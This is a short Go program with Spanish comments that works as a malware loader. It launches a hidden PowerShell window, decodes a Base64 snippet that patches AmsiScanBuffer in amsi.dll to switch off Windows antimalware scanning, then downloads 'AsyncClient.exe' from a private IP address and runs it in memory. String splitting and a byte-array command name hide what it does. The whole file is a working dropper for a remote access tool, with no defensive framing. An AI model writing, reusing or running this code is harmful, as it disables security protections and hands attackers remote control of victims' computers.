// todos los programas deben tener un punto de entrada llamados package main
package main

import (
	"os/exec"
	"syscall"
)

//funcion principal

func main() {
	//ejecutar funcion que ejecutara el comando en terminal, tambien se declara el comando que se ejecutara
	//powershell oculta que descargara una carga util .exe, la almacena en la carpeta / variable public y finalmente la ejecuta
	comando_terminal(`$Win32 = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('CgB1AHMAaQBuAGcAIABTAHkAcwB0AGUAbQA7AAoAdQBzAGkAbgBnACAAUwB5AHMAdABlAG0ALgBSAHUAbgB0AGkAbQBlAC4ASQBuAHQAZQByAG8AcABTAGUAcgB2AGkAYwBlAHMAOwAKAAoAcAB1AGIAbABpAGMAIABjAGwAYQBzAHMAIABXAGkAbgAzADIAIAB7AAoACgAgACAAIAAgAFsARABsAGwASQBtAHAAbwByAHQAKAAiAGsAZQByAG4AZQBsADMAMgAiACkAXQAKACAAIAAgACAAcAB1AGIAbABpAGMAIABzAHQAYQB0AGkAYwAgAGUAeAB0AGUAcgBuACAASQBuAHQAUAB0AHIAIABHAGUAdABQAHIAbwBjAEEAZABkAHIAZQBzAHMAKABJAG4AdABQAHQAcgAgAGgATQBvAGQAdQBsAGUALAAgAHMAdAByAGkAbgBnACAAcAByAG8AYwBOAGEAbQBlACkAOwAKAAoAIAAgACAAIABbAEQAbABsAEkAbQBwAG8AcgB0ACgAIgBrAGUAcgBuAGUAbAAzADIAIgApAF0ACgAgACAAIAAgAHAAdQBiAGwAaQBjACAAcwB0AGEAdABpAGMAIABlAHgAdABlAHIAbgAgAEkAbgB0AFAAdAByACAATABvAGEAZABMAGkAYgByAGEAcgB5ACgAcwB0AHIAaQBuAGcAIABuAGEAbQBlACkAOwAKAAoAIAAgACAAIABbAEQAbABsAEkAbQBwAG8AcgB0ACgAIgBrAGUAcgBuAGUAbAAzADIAIgApAF0ACgAgACAAIAAgAHAAdQBiAGwAaQBjACAAcwB0AGEAdABpAGMAIABlAHgAdABlAHIAbgAgAGIAbwBvAGwAIABWAGkAcgB0AHUAYQBsAFAAcgBvAHQAZQBjAHQAKABJAG4AdABQAHQAcgAgAGwAcABBAGQAZAByAGUAcwBzACwAIABVAEkAbgB0AFAAdAByACAAZAB3AFMAaQB6AGUALAAgAHUAaQBuAHQAIABmAGwATgBlAHcAUAByAG8AdABlAGMAdAAsACAAbwB1AHQAIAB1AGkAbgB0ACAAbABwAGYAbABPAGwAZABQAHIAbwB0AGUAYwB0ACkAOwAKAAoAfQA=')));; Add-Type $Win32; $LoadLibrary = [Win32]::LoadLibrary('am' + 'si.dll'); $Address = [Win32]::GetProcAddress($LoadLibrary, 'Amsi' + 'Scan' + 'Buffer'); $p = 0; [Win32]::VirtualProtect($Address, [uint32]5, 0x40, [ref]$p); $Patch = [Byte[]] (0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3); $l = [System.Runtime.InteropServices.Marshal]; $l::('Co' + 'py')($Patch,0, $Address, 6); [AppDomain]::CurrentDomain.Load((New-Object System.Net.WebClient).DownloadData('http://192.168.121.129/AsyncClient.exe')).EntryPoint.invoke($null,$null)`)

}

// funcion que ejecutara el comando en la terminal
// comando : sera el comando que se ejecutara en terminal
func comando_terminal(comando string) string {
	//ejecucion del comando en terminal, en este caso en powershell
	cmd := exec.Command(string([]byte{'p', 'o', 'w', 'e', 'r', 's', 'h', 'e', 'l', 'l'}),
		"-c",
		comando,
	)
	//se indica que la terminal este oculta
	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
	//manejo de la respuesta tras la ejecucion del comando en terminal
	respuesta_comando, _ := cmd.CombinedOutput()
	return string(respuesta_comando)
}
